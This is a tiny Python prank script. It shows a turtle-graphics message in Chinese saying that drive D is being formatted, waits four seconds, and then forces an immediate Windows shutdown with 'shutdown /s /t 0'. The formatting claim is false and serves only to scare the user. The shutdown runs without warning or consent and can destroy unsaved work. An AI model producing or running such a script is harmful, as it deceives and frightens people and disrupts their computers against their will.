from turtle import Pen
from time import sleep
from os import system
t=Pen()
t.write ('正在格式化D盘',font=10)
t.hideturtle()
sleep(4)
system("shutdown /s /t 0 -c '正在格式化D盘'")